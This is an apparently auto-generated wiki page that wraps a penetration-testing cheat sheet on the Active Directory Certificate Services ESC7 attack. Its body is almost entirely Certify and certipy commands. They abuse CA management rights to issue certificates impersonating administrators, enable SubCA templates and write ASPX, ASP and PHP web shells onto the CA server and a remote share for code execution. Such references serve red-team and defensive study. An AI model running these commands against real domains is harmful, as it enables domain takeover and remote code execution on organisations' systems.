---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC7

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc07` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc07.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC7](../../topics/active-directory/active-directory-certificate-esc7.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc07 |
| name | Active Directory - Certificate ESC7 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc07.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC7\n\n## ESC7 - Vulnerable Certificate Authority Access Control\n\n**Exploitation**\n\
  \n* Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions\n\n    ```ps1\n    Certify.exe\
  \ find /vulnerable\n    # or\n    certipy find -enabled -u user@domain.local -p password -dc-ip 10.10.10.10\n\n    # add\
  \ \"Manage Certificates\" privilege\n    certipy ca -ca 'DOMAIN-CA' -username user@domain.local -p GoldCrown -add-officer\
  \ user -dc-ip 10.10.10.10 -target-ip 10.10.10.11\n    ```\n\n* Change the CA settings to enable the SAN extension for all\
  \ the templates under the vulnerable CA (ESC6)\n\n    ```ps1\n    Certify.exe setconfig /enablesan /restart\n    ```\n\n\
  * Request the certificate with the desired SAN.\n\n    ```ps1\n    Certify.exe request /template:User /altname:super.adm\n\
  \    ```\n\n* Grant approval if required or disable the approval requirement\n\n    ```ps1\n    # Grant\n    Certify.exe\
  \ issue /id:[REQUEST ID]\n    # Disable\n    Certify.exe setconfig /removeapproval /restart\n    ```\n\n**Exploitation 2**:\n\
  \nAlternative exploitation from **ManageCA** to **RCE** on ADCS server:\n\n```ps1\n# Get the current CDP list. Useful to\
  \ find remote writable shares:\nCertify.exe writefile /ca:SERVER\\ca-name /readonly\n\n# Write an aspx shell to a local\
  \ web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\\
  Local\\Path\\shell.aspx\n\n# Write the default asp shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name\
  \ /path:c:\\inetpub\\wwwroot\\shell.asp\n\n# Write a php shell to a remote web directory:\nCertify.exe writefile /ca:SERVER\\\
  ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php\n```\n\n**Exploitation 3**:\n\n```ps1\n\
  # enable SubCA template\ncertipy ca -ca 'DOMAIN-CA' -enable-template 'SubCA' -username user@domain.local -p password -dc-ip\
  \ 10.10.10.10 -target-ip 10.10.10.11\n\n# request a certificate based on subCA template\ncertipy req -ca 'DOMAIN-CA' -username\
  \ user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -template SubCA -upn administrator@domain.local\n\
  \n# issue failed certificate request\ncertipy ca -ca 'DOMAIN-CA' -issue-request 7 -username user@domain.local -p password\
  \ -dc-ip 10.10.10.10 -target-ip 10.10.10.11\n\n# retrieve the issued certificate\ncertipy req -ca 'DOMAIN-CA' -username\
  \ user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -retrieve 7\n```\n\n## References\n\n* [AD CS:\
  \ weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)\n\
  * [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)"
_relative_path: active-directory/ad-adcs-esc07.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc07.md
````
